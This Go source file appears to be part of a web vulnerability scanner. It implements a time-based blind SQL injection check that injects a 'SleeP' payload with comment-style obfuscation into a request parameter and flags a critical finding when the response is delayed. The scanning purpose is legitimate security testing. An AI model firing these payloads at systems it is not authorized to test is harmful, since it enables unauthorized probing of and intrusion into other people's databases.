package sql

import (
	"fmt"
	JieOutput "github.com/yhy0/ChYing/pkg/Jie/pkg/output"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"github.com/yhy0/logging"
	"time"
)

/**
  @author: yhy
  @since: 2023/2/9
  @desc: 时间盲注
**/

func (sql *Sqlmap) checkTimeBasedBlind(pos int) bool {
	err, standardRespTime := getNormalRespondTime(sql)
	if err != nil {
		// 因获取响应时间出错 不再继续测试时间盲注
		logging.Logger.Debugln("尝试检测 TimBased-Blind响应时间失败")
		return false
	}
	logging.Logger.Debugf("%s 网站的正常响应时间应小于: %v ms", sql.Url, standardRespTime)

	for _, closeType := range CloseType {
		payload := fmt.Sprintf(`%v/**/And/**/SleeP(%v)#`, closeType, standardRespTime*2/1000+3)

		for index, param := range sql.Variations.Params {
			if index == pos {
				payload = sql.Variations.SetPayloadByIndex(param.Index, sql.Url, param.Value+payload, sql.Method)
				if payload == "" {
					continue
				}
				var res *httpx.Response
				if sql.Method == "GET" {
					res, err = sql.Client.Request(payload, sql.Method, "", sql.Headers, "SQL-Injection")
				} else {
					res, err = sql.Client.Request(sql.Url, sql.Method, payload, sql.Headers, "SQL-Injection")
				}

				if err != nil {
					continue
				}

				if res.ServerDurationMs > standardRespTime+2000 {
					JieOutput.OutChannel <- JieOutput.VulMessage{
						DataType: "web_vul",
						Plugin:   "SQL Injection",
						VulnData: JieOutput.VulnData{
							CreateTime:  time.Now().Format("2006-01-02 15:04:05"),
							Target:      sql.Url,
							Ip:          "",
							Param:       param.Name,
							Request:     res.RequestDump,
							Response:    res.ResponseDump,
							Payload:     payload,
							Description: fmt.Sprintf("Time-Based Blind SQL Injection: [%v:%v]", param.Name, param.Value),
						},
						Level: JieOutput.Critical,
					}
					logging.Logger.Debugf("存在基于时间的 SQL 注入: [参数名:%v 原值:%v]", param.Name, param.Value)

					return true
				} else {
					continue
				}
			}
		}
	}

	return false
}
